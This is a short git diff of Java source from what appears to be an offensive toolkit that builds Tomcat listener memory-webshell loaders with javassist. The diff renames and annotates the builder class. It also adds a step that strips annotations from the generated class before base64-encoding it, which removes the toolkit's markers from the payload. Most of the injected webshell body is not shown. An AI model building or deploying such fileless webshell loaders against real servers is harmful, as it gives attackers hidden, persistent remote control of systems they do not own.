@@ -1,19 +1,19 @@
-package com.ppp.middleware.tomcat;
+package com.ppp.middleware.builder;
 
-import com.ppp.utils.Encoder;
-import com.ppp.utils.JavaClassUtils;
-import javassist.ClassClassPath;
-import javassist.ClassPool;
-import javassist.CtClass;
-import javassist.CtMethod;
+import com.ppp.annotation.Builder;
+import com.ppp.annotation.MemShell;
+import com.ppp.annotation.Middleware;
+import com.ppp.utils.maker.Encoder;
+import com.ppp.utils.maker.JavaClassUtils;
+import javassist.*;
 
 /**
  * @author Whoopsunix
  */
-public class TomcatLoaderMaker {
-    /**
-     * Listener 内存马
-     */
+@Builder(Builder.Loader)
+@Middleware(Middleware.Tomcat)
+public class TomcatLoaderBuilder {
+    @MemShell(MemShell.Listener)
     public String listener(Class cls, String MSGzipBase64) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
@@ -66,6 +66,8 @@ public class TomcatLoaderMaker {
                 "}\n" +
                 "flag = true;}");
 
+        // 清除所有注解
+        JavaClassUtils.clearAllAnnotations(ctClass);
 
         byte[] classBytes = ctClass.toBytecode();
         String b64 = Encoder.base64encoder(classBytes);
